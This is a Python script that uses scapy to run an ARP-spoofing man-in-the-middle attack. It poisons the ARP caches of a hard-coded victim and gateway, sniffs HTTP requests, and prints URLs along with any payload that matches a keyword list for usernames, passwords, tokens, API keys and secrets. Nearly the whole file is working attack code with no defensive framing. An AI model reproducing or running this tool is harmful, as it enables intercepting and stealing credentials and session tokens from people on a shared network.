import scapy.all as scapy
from scapy.layers import http




def spoof(target_ip, target_mac, spoof_ip):
    ether = scapy.Ether(dst=target_mac)
    arp = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, op="is-at")
    packet = ether / arp
    scapy.sendp(packet, verbose=False)


def get_mac(ip):
    arp_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip)
    reply, something = scapy.srp(arp_request, timeout=3, verbose=0)
    if reply:
        return reply[0][1].src
    return None

def wait_to_mac(ip):
    mac = None
    while not mac:
      mac = get_mac(ip)
      if not mac:
        print("MAC address for {} target not found".format(ip))
    print("target mac address is: {}".format(mac))
    return mac



def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url= get_url(packet)
        print("HTTP url is {}".format(url))
        cred=get_cred(packet)
        if cred:
            print("possilble information{}".format(cred))

keywords = [
    "username", "user", "uname", "usr", "u_name",
    "password", "pass", "pwd", "pswd", "pword", "passwrd",
    "login", "logon", "signin", "sign_in", "sign-in",
    "email", "mail", "e-mail",
    "auth", "auth_token", "authentication", "token", "access_token", "session", "sessid",
    "key", "apikey", "api_key", "secret", "secretkey", "secret_key",
    "cred", "creds", "credential", "credentials"
]


def get_cred(packet):
    if packet.haslayer(scapy.Raw):
        feild_load= packet[scapy.Raw].load.decode('utf-8')
        for keyword in keywords:
            if keyword in feild_load:
                return feild_load
            


def get_url(packet):
    return (packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path ).decode('utf-8')           





gateway_ip = "192.168.1.1"
target_ip = "192.168.1.12"
target_mac=wait_to_mac(target_ip)
gateway_mac=wait_to_mac(gateway_ip)



while True:
    spoof(target_ip=target_ip, target_mac=target_mac,  spoof_ip=gateway_ip)
    spoof(target_ip=gateway_ip, target_mac=gateway_mac, spoof_ip=target_ip)
    sniff("\\Device\\NPF_{341C45B7-4C71-46E7-B4C2-4E14BB577DFF}")    









         






